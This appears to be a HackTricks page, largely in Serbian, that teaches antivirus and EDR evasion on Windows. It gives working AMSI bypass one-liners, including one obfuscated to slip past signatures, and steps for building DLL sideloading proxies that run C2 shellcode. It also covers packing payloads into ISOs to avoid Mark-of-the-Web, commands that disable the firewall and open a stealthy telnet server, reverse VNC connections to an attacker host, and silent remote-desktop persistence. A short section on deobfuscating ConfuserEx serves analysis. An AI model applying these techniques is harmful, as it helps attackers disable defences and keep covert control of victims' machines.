# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje Windows Defender-a falsifikovanjem drugog AV-a.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može dovesti do lakšeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Encryption**

Ako enkriptujete binarni fajl, AV neće moći da detektuje vaš program, ali će vam trebati loader koji dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da biste prošli pored AV-a, ali to može biti dugotrajan zadatak u zavisnosti od onoga što pokušavate da obfuskujete.

- **Custom tooling**

Ako razvijete sopstvene alate, neće postojati poznati loši potpisi, ali ovo zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način da proverite protiv Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i zatim zadaje Defender-u da skenira svaki pojedinačno; na taj način može tačno da vam kaže koji su stringovi ili bajtovi označeni u vašem binarnom fajlu.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnoj AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće vaš binarni fajl u sandbox-u i posmatra zlonamerno ponašanje (npr. pokušaj dekripcije i čitanja lozinki iz browsera, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti komplikovaniji za zaobilaženje, ali evo nekoliko stvari koje možete uraditi da izbegnete sandbox-e.

- **Sleep before execution** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje dynamic analysis AV-a. AV-i imaju vrlo kratak vremenski okvir za skeniranje fajlova kako ne bi ometali korisnički rad, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi sandbox-i jednostavno mogu preskočiti sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandbox-i imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi usporavali korisnikov računar. Možete biti i veoma kreativni ovde, na primer proverom temperature CPU-a ili brzine ventilatora — neće sve biti implementirano u sandbox-u.
- **Machine-specific checks** Ako želite da targetirate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara da vidite da li se poklapa sa onim što ste naveli; ako ne, vaš program može da se završi.

Ispostavilo se da je computername Microsoft Defender-ovog sandbox-a HAL9TH, pa možete proveriti ime računara u svom malveru pre detonacije; ako ime odgovara HAL9TH, znači da ste unutar defender-ovog sandbox-a i možete zaustaviti program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi veoma dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv Sandbox-a

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo rekli ranije u ovom postu, **public tools** će na kraju **biti detektovani**, pa treba da postavite sebi pitanje:

Na primer, ako želite da dump-ujete LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno ovo drugo. Uzmimo mimikatz kao primer: verovatno je jedan od, ako ne i najviše označenih komada malvera od strane AV-a i EDR-a; dok je projekat sam po sebi super kul, rad sa njim da biste zaobišli AV-e može biti prava noćna mora, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada modifikujete svoje payload-e za evasion, obavezno **isključite automatsko slanje uzoraka** u Defender-u, i, molim vas, ozbiljno, **NE UPLOADUJTE NA VIRUSTOTAL** ako vam je cilj dugoročna evazija. Ako želite da proverite da li vaš payload biva detektovan od strane određenog AV-a, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte tamo dok niste zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizujte korišćenje DLL-ova za evasion**, iz mog iskustva, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, tako da je to vrlo jednostavan trik koji možete koristiti da biste izbegli detekciju u nekim slučajevima (ako vaš payload ima način da se pokrene kao DLL naravno).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možete koristiti sa DLL fajlovima da biste bili mnogo stealth-iji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order kojeg loader koristi tako što pozicionira i aplikaciju žrtve i zlonamerni payload(e) jedan pored drugog.

Možete proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova naredba će ispisati listu programa ranjivih na DLL hijacking unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **istražite DLL Hijackable/Sideloadable programs sami**, ova tehnika može biti prilično neupadljiva ako se ispravno izvede, ali ako koristite javno poznate DLL Sideloadable programs, lako možete biti otkriveni.

Samo postavljanjem malicious DLL-a sa imenom koje program očekuje da učita neće biti dovoljno da se pokrene vaš payload, jer program očekuje određene specifične funkcije u tom DLL-u; da bismo rešili ovaj problem, koristićemo drugu tehniku zvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje iz proxy (i malicious) DLL-a ka originalnom DLL-u, čime se čuva funkcionalnost programa i omogućava rukovanje izvršenjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Toplo preporučujem da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) kako biste saznali više o onome što smo detaljnije razmatrali.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na neupadljiv način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Izbegavanje detekcije je igra mačke & miša — ono što danas radi može sutra biti otkriveno, zato se nikada ne oslanjajte samo na jedan alat; kad je moguće, pokušajte povezati više tehnika za izbegavanje.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV rešenja bila sposobna da skeniraju samo **fajlove na disku**, tako da ako biste nekako mogli da izvršite payload-e **direktno u memoriji**, AV nije imao dovoljno vidljivosti da to zaustavi.

Funkcija AMSI je integrisana u sledeće komponente Windows-a.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ona omogućava antivirus rešenjima da inspektuju ponašanje skripti izlažući sadržaj skripti u obliku koji nije enkriptovan ni obfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeće upozorenje na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako dodaje prefiks `amsi:` a zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo zapisali nijedan fajl na disk, ali smo i dalje detektovani u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod takođe prolazi kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje i izvršenje u memoriji. Zato se preporučuje korišćenje nižih verzija .NET-a (poput 4.7.2 ili niže) za izvršenje u memoriji ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost da deobfuskuje skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od toga kako je urađena. To znači da izbegavanje nije tako jednostavno. Ipak, ponekad je dovoljno da promenite nekoliko imena varijabli i bićete u redu, tako da zavisi koliko je nešto već označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se radi kao neprivilegovani korisnik. Zbog ove greške u implementaciji AMSI-ja, istraživači su pronašli više načina da se izbegne AMSI skeniranje.

**Forcing an Error**

Forsiranje neuspeha inicijalizacije AMSI-ja (amsiInitFailed) će rezultovati time da se za trenutni proces neće pokrenuti nijedno skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je dovoljna jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Naravno, ova linija je označena od strane samog AMSI, pa je potrebna modifikacija da bi se ova tehnika mogla koristiti.

Ovde je modifikovani AMSI bypass koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Uklonite detektovani potpis**

Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije tekućeg procesa. Ovi alati rade tako što skeniraju memoriju tekućeg procesa za AMSI potpis i zatim ga prepisuju NOP instrukcijama, efektivno uklanjajući potpis iz memorije.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS logovanje

PowerShell logging je funkcionalnost koja vam omogućava da beležite sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati skripte bez skeniranja od strane AMSI. Ovo možete uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrana (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije se oslanja na enkripciju podataka, što povećava entropiju binarnog fajla i može olakšati AVs i EDRs njegovo detektovanje. Budite oprezni s tim i razmislite da enkripciju primenite samo na specifične delove koda koji su osetljivi ili koje treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne forkove) često se susrećete sa više slojeva zaštite koji blokiraju dekompilere i sandbokse. Radni tok ispod pouzdano **vraća skoro originalni IL** koji se potom može dekompilovati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Ovo takođe menja PE checksum tako da bilo koja modifikacija sruši binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, povratite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpackera.

2.  Symbol / control-flow recovery – prosledite *clean* fajl na **de4dot-cex** (fork de4dot-a koji razume ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Opcije:
• `-p crx` – izaberi ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda lakim wrapper-ima (tzv. *proxy calls*) da dodatno oteža dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je poput `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite dobijeni binar pod dnSpy-om, tražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *pravi* payload. Često malware čuva payload kao TLV-enkodiran byte array inicijalizovan unutar `<Module>.byte_0`.

Gore opisani lanac vraća tok izvršavanja **bez** potrebe da se maliciozni uzorak pokreće – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut nazvan `ConfusedByAttribute` koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog paketa sposoban da poveća bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da se, u vreme kompajliranja, generiše obfuscated code bez korišćenja bilo kog eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih pomoću C++ template metaprogramming framework-a, što će otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može obfuscate različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda transformišući obične instrukcije u ROP lanće, narušavajući našu uobičajenu percepciju normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom skidanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je sigurnosni mehanizam namenjen da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše pristupom zasnovanim na reputaciji, što znači da će ređe preuzimane aplikacije pokrenuti SmartScreen, upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti izvršen klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom skidanja fajlova sa interneta, zajedno sa URL-om sa kojeg je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **pouzdanim** sertifikatom za potpisivanje **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih zapakujete u neki kontejner poput ISO-a. Ovo se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere da bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demoa za bypassing SmartScreen pakovanjem payloads unutar ISO fajlova koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam logovanja u Windows koji omogućava aplikacijama i sistemskim komponentama da beleže događaje. Međutim, on se takođe može koristiti od strane security proizvoda za praćenje i detekciju malicioznih aktivnosti.

Slično kao što se AMSI onemogućava (bypassed), moguće je naterati funkciju **`EtwEventWrite`** korisničkog prostora da odmah vrati bez beleženja događaja. To se postiže patchovanjem funkcije u memoriji da odmah vrati, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih fajlova u memoriju je poznato već dugo i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, jedino o čemu ćemo morati da brinemo jeste patchovanje AMSI-ja za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvenog procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršavanje koda i nakon završetka ubijanje novog procesa. Ovo ima svoje prednosti i mane. Prednost fork and run metode je što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj post-exploitation akciji krene naopako ili bude otkriveno, postoji **mnogo veća šansa** da će naš **implant preživeti.** Mana je što imate **veću šansu** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon** jer proces može pasti.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o C# Assembly loading, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **from PowerShell**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što ćete kompromitovanom računaru omogućiti pristup interpreter environment instaliranom na Attacker Controlled SMB share.

Dozvolom pristupa Interpreter Binaries i okruženju na SMB share-u možete izvršavati arbitrary code u tim jezicima unutar memorije kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost da bypass static signatures**. Testiranja sa random ne-obfuskovanim reverse shell skriptama u tim jezicima su bila uspešna.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili sigurnosnim proizvodom poput EDR-a ili AV-a**, dopuštajući im da mu smanje privilegije tako da proces neće ugasnuti ali neće imati dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **sprečiti spoljne procese** da dobijaju handle-ove nad tokenima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno deploy-ovati Chrome Remote Desktop na žrtvinom PC-u i zatim ga koristiti za takeover i održavanje persistence:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite installer silently na žrtvi (admin potreban): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite Authorize dugme da nastavite.
4. Pokrenite dati parametar sa nekim prilagodbama: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: pin param omogućava postavljanje pina bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, tako da je prilično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg idete ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94), da biste dobili uvid u naprednije Advanced Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **otkrije koji deo Defender** označava kao maliciozan i podeli vam to.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** prilikom pokretanja sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (neprimetno) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**NA HOSTU**: Execute _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u polju _VNC Password_
- Postavite lozinku u polju _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ u **victim**

#### **Reverse connection**

The **attacker** treba da na svom **host** pokrene binarni fajl `vncviewer.exe -listen 5900` kako bi bio spreman da uhvati reverse **VNC connection**. Zatim, na **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, ne smete uraditi nekoliko stvari

